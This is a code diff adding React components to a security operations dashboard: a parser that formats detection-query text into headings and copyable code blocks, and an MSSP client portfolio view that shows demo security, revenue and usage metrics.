+  // Parse text into sections. Detect: ALL-CAPS headings, KQL QUERY N:, code blocks
+  const lines = text.split('\n');
+  const blocks = [];
+  let codeBuffer = [];
+  let inCode = false;
+  let codeId = 0;
+
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+    const trimmed = line.trim();
+    if (!trimmed) { if (!inCode) continue; }
+
+    // Detect code block start: line ending in { or contains | where or | search or | stats
+    const endsWithOp = ['{','}',';','|'].some(c=>trimmed.endsWith(c)); const isCodeLine = endsWithOp || /^(DeviceProcess|DeviceNetwork|Security|Identity|Cloud|Mailbox|source=|index=)/.test(trimmed) || (inCode && trimmed.length > 0);
+    const isQueryLabel = /^(KQL QUERY|SPLUNK QUERY|SENTINEL|DEFENDER|MICROSOFT|SOURCE=)/i.test(trimmed);
+    const isMajorHeading = /^[A-Z][A-Z\s\-:\/]+$/.test(trimmed) && trimmed.length > 8 && trimmed.length < 80 && !isCodeLine;
+    const isSubHeading = /^(KQL QUERY \d+:|SPLUNK QUERY FOR |MICROSOFT |DETECTION |REMEDIATION |COMPENSATING |COMMON |HOW ATTACKERS)/i.test(trimmed);
+
+    if (isSubHeading || isQueryLabel) {
+      if (inCode && codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
+      blocks.push({ type:'subheading', content:trimmed });
+      inCode = true; // next lines are likely code
+    } else if (isMajorHeading) {
+      if (inCode && codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
+      blocks.push({ type:'heading', content:trimmed });
+      inCode = false;
+    } else if (inCode && trimmed) {
+      codeBuffer.push(line);
+    } else {
+      if (codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
+      blocks.push({ type:'text', content:trimmed });
+    }
+  }
+  if (codeBuffer.length) blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) });
+
+  return (
+    <div style={{display:'flex',flexDirection:'column',gap:10}}>
+      {blocks.map((block, i) => {
+        if (block.type === 'heading') return (
+          <div key={i} style={{fontSize:'0.58rem',fontWeight:800,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1.5px',paddingTop: i>0?8:0,borderTop: i>0?'1px solid var(--wt-border)':'none',marginTop: i>0?2:0}}>{block.content}</div>
+        );
+        if (block.type === 'subheading') return (
+          <div key={i} style={{fontSize:'0.68rem',fontWeight:700,color:'var(--wt-text)',marginTop:4,marginBottom:-4}}>{block.content}</div>
+        );
+        if (block.type === 'code') return (
+          <div key={i} style={{position:'relative',background:'#020306',border:'1px solid #1a2235',borderRadius:8,overflow:'hidden'}}>
+            <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',padding:'5px 10px',borderBottom:'1px solid #1a2235',background:'#060912'}}>
+              <span style={{fontSize:'0.54rem',fontWeight:700,color:'#4f8fff',letterSpacing:'0.5px',textTransform:'uppercase'}}>Query</span>
+              <button onClick={()=>copyCode(block.content, block.id||'')} style={{fontSize:'0.56rem',fontWeight:600,padding:'2px 8px',borderRadius:4,border:'1px solid #1e2536',background:'transparent',color:copied===block.id?'#22d49a':'var(--wt-muted)',cursor:'pointer',fontFamily:'Inter,sans-serif',transition:'color .15s'}}>
+                {copied===block.id?'✓ Copied':'Copy'}
+              </button>
+            </div>
+            <pre style={{margin:0,padding:'10px 12px',fontSize:'0.63rem',fontFamily:'JetBrains Mono,monospace',color:'#a8c0e8',lineHeight:1.7,overflowX:'auto',whiteSpace:'pre-wrap',wordBreak:'break-all'}}>{block.content.trim()}</pre>
+          </div>
+        );
+        return (
+          <div key={i} style={{fontSize:'0.72rem',color:'var(--wt-secondary)',lineHeight:1.7}}>{block.content}</div>
+        );
+      })}
+    </div>
+  );
+}
+
+// ─── MSSP Portfolio Component ────────────────────────────────────────────────
+
+function MSSPPortfolio({ currentTenant, setCurrentTenant, DEMO_TENANTS, isAdmin, setActiveTab, setAdminBannerInput }) {
+  const [portfolioView, setPortfolioView] = React.useState('security');
+  const [selectedClient, setSelectedClient] = React.useState(null);
+
+  // The MSSP's own managed clients — organisations they provide SOC services to
+  // In production this would load from /api/portfolio based on the MSSP's tenant ID
+  const MY_CLIENTS = [
+    {id:'client-acme',  name:'Acme Financial',  sector:'Financial Services', seats:8,  mrr:199, contractStart:'2024-01-15', renewalDate:'2025-01-15', billingStatus:'Paid',    posture:82, alerts:8,  critAlerts:3, incidents:2, coverage:94, kevVulns:3,  lastSeen:'2m ago',  toolsConnected:4},
+    {id:'client-nhs',   name:'NHS Trust Alpha',  sector:'Healthcare',         seats:14, mrr:199, contractStart:'2024-03-01', renewalDate:'2025-03-01', billingStatus:'Paid',    posture:71, alerts:15, critAlerts:5, incidents:3, coverage:88, kevVulns:7,  lastSeen:'1m ago',  toolsConnected:6},
+    {id:'client-retail',name:'RetailCo UK',      sector:'Retail',             seats:6,  mrr:294, contractStart:'2024-06-10', renewalDate:'2025-06-10', billingStatus:'Paid',    posture:91, alerts:4,  critAlerts:1, incidents:1, coverage:97, kevVulns:4,  lastSeen:'5m ago',  toolsConnected:5},
+    {id:'client-gov',   name:'Gov Dept Beta',   sector:'Government',         seats:10, mrr:199, contractStart:'2024-09-20', renewalDate:'2025-09-20', billingStatus:'Overdue', posture:78, alerts:9,  critAlerts:3, incidents:1, coverage:92, kevVulns:5,  lastSeen:'8m ago',  toolsConnected:3},
+  ];
+
+  const totalMRR = MY_CLIENTS.reduce((s,c)=>s+c.mrr, 0);
+  const totalSeats = MY_CLIENTS.reduce((s,c)=>s+c.seats, 0);
+  const overdueMRR = MY_CLIENTS.filter(c=>c.billingStatus==='Overdue').reduce((s,c)=>s+c.mrr, 0);
+
+  return (
+    <div style={{display:'flex',flexDirection:'column',gap:14}}>
+
+      {/* Header */}
+      <div style={{display:'flex',alignItems:'center',gap:10,flexWrap:'wrap'}}>
+        <div>
+          <h2 style={{fontSize:'0.88rem',fontWeight:700,display:'flex',alignItems:'center',gap:8}}>
+            My Client Portfolio
+            <span style={{fontSize:'0.62rem',color:'#8b6fff',background:'#8b6fff12',padding:'2px 8px',borderRadius:4,border:'1px solid #8b6fff25',fontWeight:700}}>MSSP</span>
+          </h2>
+          <div style={{fontSize:'0.68rem',color:'var(--wt-muted)',marginTop:2}}>Organisations you manage security for · {MY_CLIENTS.length} active clients</div>
+        </div>
+        <div style={{display:'flex',gap:3,background:'var(--wt-card2)',borderRadius:7,padding:3,marginLeft:'auto'}}>
+          {['security','revenue','usage'].map(v=>(
+            <button key={v} onClick={()=>setPortfolioView(v)} style={{padding:'5px 14px',borderRadius:5,border:'none',background:portfolioView===v?'#8b6fff':'transparent',color:portfolioView===v?'#fff':'var(--wt-muted)',fontSize:'0.68rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',textTransform:'capitalize'}}>{v}</button>
+          ))}
+        </div>
+      </div>
+
+      {/* Security summary */}
+      {portfolioView==='security' && (
+        <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8}}>
+          {[
+            {label:'Active Incidents',  val:MY_CLIENTS.reduce((s,c)=>s+c.incidents,0),  color:'#f0405e'},
+            {label:'Critical Alerts',   val:MY_CLIENTS.reduce((s,c)=>s+c.critAlerts,0), color:'#f0405e'},
+            {label:'KEV Outstanding',   val:MY_CLIENTS.reduce((s,c)=>s+c.kevVulns,0),   color:'#f97316'},
+            {label:'Avg Posture Score', val:`${Math.round(MY_CLIENTS.reduce((s,c)=>s+c.posture,0)/MY_CLIENTS.length)}%`, color:'#22d49a'},
+          ].map(s=>(
+            <div key={s.label} style={{padding:'14px 16px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:12,textAlign:'center'}}>
+              <div style={{fontSize:'1.8rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-2}}>{s.val}</div>
+              <div style={{fontSize:'0.6rem',color:'var(--wt-muted)',marginTop:2}}>{s.label}</div>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {/* Revenue summary */}
+      {portfolioView==='revenue' && (
+        <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8}}>
+          {[
+            {label:'Monthly Recurring Revenue', val:`£${totalMRR.toLocaleString()}`, sub:'MRR', color:'#22d49a'},
+            {label:'Annual Recurring Revenue',  val:`£${(totalMRR*12/1000).toFixed(1)}k`, sub:'ARR', color:'#4f8fff'},
+            {label:'Seats Under Management',    val:totalSeats, sub:'seats', color:'#8b6fff'},
+            {label:'Overdue Balance',           val:overdueMRR>0?`£${overdueMRR}`:'£0', sub:overdueMRR>0?'action needed':'all clear', color:overdueMRR>0?'#f0405e':'#22d49a'},
+          ].map(s=>(
+            <div key={s.label} style={{padding:'14px 16px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:12}}>
+              <div style={{fontSize:'1.8rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-2,lineHeight:1}}>{s.val}</div>
+              <div style={{fontSize:'0.58rem',fontWeight:700,color:s.color,textTransform:'uppercase',letterSpacing:'0.5px',marginTop:3}}>{s.sub}</div>
+              <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:2}}>{s.label}</div>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {/* Usage summary */}
+      {portfolioView==='usage' && (
+        <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8}}>
+          {[
+            {label:'Total Alerts This Week',  val:MY_CLIENTS.reduce((s,c)=>s+c.alerts,0),   color:'#4f8fff'},
+            {label:'AI Auto-Closed',          val:Math.round(MY_CLIENTS.reduce((s,c)=>s+c.alerts,0)*0.68)+' FPs', color:'#22d49a'},
+            {label:'Tools Connected (avg)',   val:Math.round(MY_CLIENTS.reduce((s,c)=>s+c.toolsConnected,0)/MY_CLIENTS.length), color:'#8b6fff'},
+            {label:'Critical Incidents Open', val:MY_CLIENTS.reduce((s,c)=>s+c.incidents,0), color:'#f0405e'},
+            {label:'Avg Coverage',            val:Math.round(MY_CLIENTS.reduce((s,c)=>s+c.coverage,0)/MY_CLIENTS.length)+'%', color:'#22d49a'},
+            {label:'Seats Managed',           val:totalSeats, color:'#4f8fff'},
+          ].map(s=>(
+            <div key={s.label} style={{padding:'14px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:10}}>
+              <div style={{fontSize:'1.4rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-1}}>{s.val}</div>
+              <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:3}}>{s.label}</div>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {/* Per-client rows */}
+      {MY_CLIENTS.map(client=>{
+        const isSel = selectedClient===client.id;
+        const postureColor = client.posture>=85?'#22d49a':client.posture>=70?'#f0a030':'#f0405e';
+        const daysToRenewal = Math.round((new Date(client.renewalDate).getTime()-Date.now())/(86400000));
+        const renewalColor = daysToRenewal<30?'#f0405e':daysToRenewal<90?'#f0a030':'#22d49a';
+
+        return (
+          <div key={client.id} style={{background:currentTenant===client.id?'#080d18':'var(--wt-card)',border:`1px solid ${currentTenant===client.id?'#8b6fff40':client.billingStatus==='Overdue'?'#f0405e20':'var(--wt-border)'}`,borderRadius:12,overflow:'hidden'}}>
+
+            {/* Client header row */}
+            <div style={{padding:'12px 16px',display:'flex',alignItems:'center',gap:12,cursor:'pointer'}} onClick={()=>setSelectedClient(isSel?null:client.id)}>
+              <div style={{width:9,height:9,borderRadius:'50%',background:'#22c992',boxShadow:'0 0 6px #22c992',flexShrink:0}} />
+              <div style={{flex:1}}>
+                <div style={{display:'flex',alignItems:'center',gap:7,flexWrap:'wrap'}}>
+                  <span style={{fontSize:'0.86rem',fontWeight:700}}>{client.name}</span>
+                  <span style={{fontSize:'0.56rem',color:'var(--wt-dim)'}}>{client.sector}</span>
+                  {client.billingStatus==='Overdue' && <span style={{fontSize:'0.54rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:'#f0405e12',color:'#f0405e',border:'1px solid #f0405e20'}}>⚠ OVERDUE</span>}
+                  {currentTenant===client.id && <span style={{fontSize:'0.52rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:'#8b6fff15',color:'#8b6fff',border:'1px solid #8b6fff25'}}>VIEWING</span>}
+                </div>
+                <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:1}}>Last active {client.lastSeen} · {client.seats} seats · {client.toolsConnected} tools</div>
+              </div>
+              {/* Quick stats */}
+              {portfolioView==='security' && (
+                <div style={{display:'flex',alignItems:'center',gap:12,flexWrap:'wrap'}}>
+                  <div style={{display:'flex',alignItems:'center',gap:5}}>
+                    <div style={{width:28,height:28,borderRadius:'50%',background:`conic-gradient(${postureColor} ${client.posture}%,var(--wt-border) 0)`,display:'flex',alignItems:'center',justifyContent:'center'}}>
+                      <div style={{width:20,height:20,borderRadius:'50%',background:'var(--wt-card)',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.46rem',fontWeight:900,color:postureColor}}>{client.posture}</div>
+                    </div>
+                  </div>
+                  {[{label:'Alerts',val:client.alerts,c:client.critAlerts>0?'#f0a030':'var(--wt-secondary)'},{label:'Critical',val:client.critAlerts,c:client.critAlerts>0?'#f0405e':'var(--wt-secondary)'},{label:'Incidents',val:client.incidents,c:client.incidents>0?'#f0405e':'var(--wt-secondary)'},{label:'Coverage',val:client.coverage+'%',c:client.coverage>=95?'#22d49a':client.coverage>=85?'#f0a030':'#f0405e'}].map(s=>(
+                    <div key={s.label} style={{textAlign:'center',minWidth:46}}>
+                      <div style={{fontSize:'1rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.c,letterSpacing:-1}}>{s.val}</div>
+                      <div style={{fontSize:'0.5rem',color:'var(--wt-dim)'}}>{s.label}</div>
+                    </div>
+                  ))}
+                </div>
+              )}
+              {portfolioView==='revenue' && (
+                <div style={{display:'flex',gap:14}}>
+                  {[{label:'MRR',val:`£${client.mrr}`,c:'#22d49a'},{label:'Renewal',val:`${daysToRenewal}d`,c:renewalColor},{label:'Billing',val:client.billingStatus,c:client.billingStatus==='Paid'?'#22d49a':'#f0405e'}].map(s=>(
+                    <div key={s.label} style={{textAlign:'center',minWidth:52}}>
+                      <div style={{fontSize:'0.9rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:s.c,letterSpacing:-0.5}}>{s.val}</div>
+                      <div style={{fontSize:'0.5rem',color:'var(--wt-dim)'}}>{s.label}</div>
+                    </div>
+                  ))}
+                </div>
+              )}
+              {portfolioView==='usage' && (
+                <div style={{display:'flex',gap:14}}>
+                  {[{label:'Alerts',val:client.alerts,c:'#4f8fff'},{label:'AI Closed',val:Math.round(client.alerts*0.68),c:'#22d49a'},{label:'Tools',val:client.toolsConnected,c:'#8b6fff'}].map(s=>(
+                    <div key={s.label} style={{textAlign:'center',minWidth:46}}>
+                      <div style={{fontSize:'0.9rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:s.c}}>{s.val}</div>
+                      <div style={{fontSize:'0.5rem',color:'var(--wt-dim)'}}>{s.label}</div>
+                    </div>
+                  ))}
+                </div>
+              )}
+              {/* Action buttons */}
+              <div style={{display:'flex',gap:5,flexShrink:0,marginLeft:8}}>
+                <button onClick={e=>{e.stopPropagation();setCurrentTenant(client.id);if(setActiveTab)setActiveTab('overview');}} style={{padding:'5px 12px',borderRadius:7,border:'1px solid #8b6fff30',background:currentTenant===client.id?'#8b6fff20':'#8b6fff10',color:'#8b6fff',fontSize:'0.66rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>
+                  {currentTenant===client.id?'● Viewing':'View →'}
+                </button>
+                <button onClick={e=>{e.stopPropagation();if(setAdminBannerInput)setAdminBannerInput('['+client.name+'] ');}} style={{padding:'5px 9px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.66rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}} title='Send message to this client'>📢</button>
+              </div>
+              <span style={{fontSize:'0.7rem',color:'var(--wt-dim)',flexShrink:0}}>{isSel?'▲':'▼'}</span>
+            </div>
+
+            {/* Expanded detail */}
+            {isSel && (
+              <div style={{borderTop:'1px solid var(--wt-border)',padding:'14px 16px',background:'var(--wt-card2)'}}>
+                <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8,marginBottom:14}}>
+                  {[
+                    {label:'Contract Start',val:client.contractStart,c:'var(--wt-secondary)'},
+                    {label:'Next Renewal',  val:client.renewalDate,  c:renewalColor},
+                    {label:'Monthly Value', val:`£${client.mrr}`,   c:'#22d49a'},
+                    {label:'KEV Vulns',     val:client.kevVulns,    c:'#f97316'},
+                  ].map(s=>(
+                    <div key={s.label} style={{textAlign:'center',padding:'10px',background:'var(--wt-card)',borderRadius:8}}>
+                      <div style={{fontSize:'0.9rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace',color:s.c}}>{s.val}</div>
+                      <div style={{fontSize:'0.56rem',color:'var(--wt-dim)',marginTop:3}}>{s.label}</div>
+                    </div>
+                  ))}
+                </div>
+                <div style={{display:'flex',gap:8,flexWrap:'wrap'}}>
+                  <button onClick={()=>{setCurrentTenant(client.id);if(setActiveTab)setActiveTab('overview');}} style={{padding:'7px 16px',borderRadius:7,border:'1px solid #8b6fff30',background:'#8b6fff10',color:'#8b6fff',fontSize:'0.72rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>View Full Dashboard →</button>
+                  <button onClick={()=>{setCurrentTenant(client.id);if(setActiveTab)setActiveTab('alerts');}} style={{padding:'7px 14px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.72rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Alerts</button>
+                  <button onClick={()=>{setCurrentTenant(client.id);if(setActiveTab)setActiveTab('incidents');}} style={{padding:'7px 14px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.72rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Incidents</button>
+                  <button onClick={()=>{setCurrentTenant(client.id);if(setActiveTab)setActiveTab('vulns');}} style={{padding:'7px 14px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.72rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Vulns</button>
+                  {client.billingStatus==='Overdue' && <button onClick={e=>{e.stopPropagation();window.open(`mailto:accounts@${client.name.toLowerCase().replace(/[^a-z]/g,'')}.com?subject=Outstanding Invoice — ${client.name}&body=Hi,%0A%0AThis is a reminder that your Watchtower subscription invoice is currently outstanding.%0APlease arrange payment at your earliest convenience.%0A%0ARegards,%0AWatchtower Team`,'_blank');}} style={{marginLeft:'auto',padding:'7px 14px',borderRadius:7,border:'1px solid #f97316',background:'#f9731610',color:'#f97316',fontSize:'0.72rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Chase Payment</button>}
+                </div>
+              </div>
+            )}
+          </div>
+        );
+      })}
+
+      {/* MSSP billing footer */}
+      <div style={{padding:'12px 16px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,display:'flex',justifyContent:'space-between',alignItems:'center',flexWrap:'wrap',gap:12}}>
+        <div style={{fontSize:'0.68rem',color:'var(--wt-muted)'}}>Your Watchtower MSSP subscription: <strong style={{color:'#8b6fff'}}>£{799 + Math.max(0,(MY_CLIENTS.length-5)*79)}/mo</strong> · {MY_CLIENTS.length} clients ({MY_CLIENTS.length<=5?'included':MY_CLIENTS.length-5+' extra × £79'})</div>
+        <div style={{fontSize:'0.68rem',color:'var(--wt-muted)'}}>Your MRR from clients: <strong style={{color:'#22d49a'}}>£{totalMRR}/mo</strong> · Margin: <strong style={{color:'#22d49a'}}>£{totalMRR-(799+Math.max(0,(MY_CLIENTS.length-5)*79))}/mo</strong></div>
+      </div>
+
+    </div>
+  );
+}
+
+
+// ─── Tools Tab ───────────────────────────────────────────────────────────────
+
 export default function DashboardPage() {
   const [activeTab, setActiveTab] = useState('overview');
   const [automation, setAutomation] = useState(1);
